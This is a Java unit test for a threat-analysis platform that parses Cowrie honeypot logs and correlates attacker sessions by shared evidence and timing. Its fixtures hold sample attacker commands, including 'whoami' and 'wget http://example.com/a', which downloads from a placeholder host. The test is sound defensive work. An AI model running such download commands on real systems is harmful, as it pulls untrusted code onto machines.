package users.rishik.threatPlatform.attack;

import com.fasterxml.jackson.databind.ObjectMapper;
import org.junit.jupiter.api.Test;
import users.rishik.threatPlatform.attack.analysis.correlation.CorrelationEvidenceResult;
import users.rishik.threatPlatform.attack.analysis.correlation.CorrelationService;
import users.rishik.threatPlatform.attack.dto.ThreatObservation;
import users.rishik.threatPlatform.attack.mapper.CowrieObservationMapper;
import users.rishik.threatPlatform.attack.service.CowrieObservationProcessor;
import users.rishik.threatPlatform.attack.service.JsonLineReader;

import java.nio.file.Files;
import java.nio.file.Path;
import java.util.ArrayList;
import java.util.List;

import static org.junit.jupiter.api.Assertions.assertEquals;

class CowrieObservationProcessorTest {

    @Test
    void shouldConvertRawEventsIntoObservations() throws Exception {

        Path file = Files.createTempFile(
                "cowrie-test",
                ".json"
        );

        Files.writeString(
                file,
                """
                {"ts":"2025-06-27T10:00:00Z","src_ip":"1.2.3.4","src_port":12345,"dst_ip":"10.0.0.1","dst_port":22,"eventid":"cowrie.login.success","session":"session-1","protocol":"ssh","input":"whoami"}
                {"ts":"2025-06-27T10:01:00Z","src_ip":"1.2.3.4","src_port":12345,"dst_ip":"10.0.0.1","dst_port":22,"eventid":"cowrie.command.input","session":"session-1","protocol":"ssh","input":"ls"}
                """
        );

        CowrieObservationProcessor processor =
                new CowrieObservationProcessor(
                        new JsonLineReader(new ObjectMapper()),
                        new CowrieObservationMapper()
                );

        List<ThreatObservation> observations =
                new ArrayList<>();

        processor.process(
                file,
                observations::add
        );

        assertEquals(2, observations.size());

        assertEquals(
                "1.2.3.4",
                observations.get(0).getSourceIp()
        );

        assertEquals(
                "whoami",
                observations.get(0).getCommand()
        );

        assertEquals(
                "ls",
                observations.get(1).getCommand()
        );

        Files.deleteIfExists(file);
    }

    @Test
    void shouldProcessObservationsForCorrelation() throws Exception {

        Path file = Files.createTempFile(
                "cowrie-correlation-test",
                ".json"
        );

        Files.writeString(
                file,
                """
                {"ts":"2025-06-27T10:00:00Z","src_ip":"1.2.3.4","src_port":12345,"dst_ip":"10.0.0.1","dst_port":22,"eventid":"cowrie.login.success","session":"session-1","protocol":"ssh","input":"wget http://example.com/a"}
                {"ts":"2025-06-27T10:05:00Z","src_ip":"1.2.3.4","src_port":12345,"dst_ip":"10.0.0.2","dst_port":22,"eventid":"cowrie.login.success","session":"session-2","protocol":"ssh","input":"wget http://example.com/a"}
                """
        );

        CowrieObservationProcessor processor =
                new CowrieObservationProcessor(
                        new JsonLineReader(new ObjectMapper()),
                        new CowrieObservationMapper()
                );

        List<ThreatObservation> observations =
                new ArrayList<>();

        processor.process(file, observations::add);

        CorrelationService correlationService =
                new CorrelationService();

        CorrelationEvidenceResult result =
                correlationService.correlate(
                        observations.get(0),
                        observations.get(1)
                );

        assertEquals(
                4,
                result.sharedEvidence().size()
        );

        assertEquals(
                300,
                result.temporalCorrelation()
                        .distance()
                        .getSeconds()
        );

        Files.deleteIfExists(file);
    }
}